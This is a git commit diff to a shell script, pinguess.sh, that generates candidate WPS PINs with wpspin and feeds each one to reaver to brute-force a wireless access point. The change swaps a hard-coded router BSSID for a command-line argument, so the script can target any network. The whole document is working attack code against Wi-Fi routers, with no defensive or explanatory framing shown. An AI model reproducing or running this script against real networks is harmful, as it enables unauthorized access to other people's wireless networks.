670489595c96efca0b7f0f977fc3bdc1a50a3bba
joshgreen95 <joshgreen95@protonmail.com>
2026-04-10 23:55:00 +0100

    Updated bug in pinguess.sh

--- pinguess.sh
+++ pinguess.sh
@@ -5,6 +5,6 @@ PINS=$(wpspin -A $1 | grep -Eo '\b[0-9]{8}\b' | tr '\n' ' ')
 for PIN in $PINS
 do
     echo Attempting PIN: $PIN
-    sudo reaver --max-attempts=1 -l 100 -r 3:45 -i mon0 -b 60:38:E0:A2:3D:2A -c 1 -p $PIN
+    sudo reaver --max-attempts=1 -l 100 -r 3:45 -i mon0 -b $1 -c 1 -p $PIN
 done
 echo "PIN Guesses Complete"
